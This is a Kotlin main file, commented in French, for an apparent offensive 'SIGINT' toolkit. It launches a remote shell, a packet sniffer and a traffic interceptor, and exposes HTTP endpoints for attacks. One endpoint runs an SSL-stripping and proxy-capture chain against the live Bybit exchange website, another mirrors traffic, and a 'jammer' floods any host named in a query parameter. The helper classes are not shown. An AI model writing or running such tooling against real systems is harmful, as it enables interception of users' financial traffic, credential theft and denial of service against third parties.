package com.fardc.sigint.core

import io.javalin.Javalin
import io.javalin.openapi.plugin.OpenApiPlugin
import java.time.Instant

/**
 * NOYAU SOUVERAIN V2.1 - INTERCEPTOR EDITION
 * Orchestration : SIGINT, Stealth, Jamming, SSL-Stripping & Proxy Capture
 */
fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE boot OK @ ${Instant.now()}")

    // 1. Initialisation des Sentinelles
    val gatekeeper = Gatekeeper()
    val killSwitch = KillSwitch()

    if (!gatekeeper.validateAccess("MainKt")) {
        killSwitch.engage()
    }

    // 2. Configuration du port Dashboard
    val port = args.firstOrNull()?.toIntOrNull() ?: System.getenv("PORT")?.toIntOrNull() ?: 7070

    // 3. Instanciation des unités de combat
    val rotator = EncryptionKeyRotator()
    val vault = SecurityVault(rotator)
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val remoteShell = RemoteShell()
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper()
    val proxyCapture = ProxyInterceptor(vault) // Nouveau module de capture

    // 🚀 ACTIVATION DES UNITÉS PERSISTANTES
    rotator.startRotation()            //
    interceptor.runInterceptionMode()   // Port 8889
    resilience.monitorSystem()          // Port 8888
    remoteShell.startShell(9090)        // Terminal Port 9090
    packetSniffer.startSniffing(9999)   // Sniffer Port 9999

    // 4. Démarrage du Dashboard Souverain
    val app = Javalin.create { config ->
        config.plugins.register(OpenApiPlugin { })
    }.start(port)

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
    println("📡 CHAÎNE D'INTERCEPTION BYBIT OPÉRATIONNELLE")

    // 5. ENDPOINTS DE CONTRÔLE ET D'ACTION

    // Audit de santé complet
    app.get("/status") { ctx ->
        val statusData = "FARDC_PSC_SOUVERAIN_v2.1_ACTIVE"
        ctx.json(
            mapOf(
                "status" to "COMBAT_READY",
                "encryption" to "AES-256-GCM",
                "secure_token" to vault.encryptData(statusData),
                "active_modules" to listOf(
                    "EncryptionRotator", "SecurityVault", "FinCap", "NetworkResilience",
                    "RemoteShell", "PacketSniffer", "SignalJammer", "SignalStealth", 
                    "TrafficMirror", "SSLStripper", "ProxyInterceptor"
                )
            )
        )
    }

    // CHAÎNE D'ATTAQUE COMBINÉE (Bybit Lab)
    app.get("/attack/bybit/engage") { ctx ->
        val target = "https://www.bybit.com"
        val proxyPort = 8082
        
        // 1. Dégradation SSL
        val downgraded = sslStripper.downgradeConnection(target)
        
        // 2. Activation de la capture
        proxyCapture.startIntercept(proxyPort)
        
        // 3. Liaison Furtive fragmentée
        signalStealth.stealthConnect(downgraded, proxyPort, "BBY_EXPLOIT_INIT")
        
        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Capture sur port $proxyPort")
    }

    // MIROIR : Duplication discrète
    app.get("/mirror") { ctx ->
        val listen = ctx.queryParam("listen")?.toInt() ?: 8081
        val host = ctx.queryParam("host") ?: ""
        val dPort = ctx.queryParam("port")?.toInt() ?: 80
        val mPort = ctx.queryParam("mirror")?.toInt() ?: 9999
        if (host.isNotEmpty()) {
            trafficMirror.startMirroring(listen, host, dPort, mPort)
            ctx.result("📡 [MIRROR] Pont actif sur port $listen")
        } else {
            ctx.status(400).result("Hôte destination manquant.")
        }
    }

    // SATURATION : Signal-Jammer
    app.get("/jam/start") { ctx ->
        val target = ctx.queryParam("target") ?: ""
        val tPort = ctx.queryParam("port")?.toIntOrNull() ?: 80
        if (target.isNotEmpty()) {
            signalJammer.startJamming(target, tPort)
            ctx.result("🔥 [JAMMER] Saturation engagée sur $target")
        } else {
            ctx.status(400).result("Cible manquante.")
        }
    }

    // URGENCE : Kill-Switch
    app.post("/emergency/halt") { ctx ->
        println("[!] ORDRE DE HALT REÇU : NEUTRALISATION...")
        proxyCapture.stop()
        ctx.status(200).result(vault.encryptData("DESTRUCTION_CONFIRMED"))
        killSwitch.engage()
    }
}
